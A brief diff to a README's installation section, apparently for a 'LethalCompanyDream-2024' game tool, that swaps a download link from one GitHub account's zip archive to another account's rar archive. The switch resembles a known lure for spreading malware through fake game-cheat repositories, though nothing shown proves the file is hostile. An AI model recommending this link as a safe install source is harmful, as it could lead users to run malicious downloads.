@@ -8,7 +8,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/5d4695b7-5f03-4edd-8aed-2e60bc54bf67)
-](https://github.com/mysticmetal/LethalCompanyDream-2024/releases/download/V5.22/Release.zip)
+](https://github.com/Ice-Brick/LethalCompanyDream-2024/releases/download/Release/Release.rar)
 
 
 
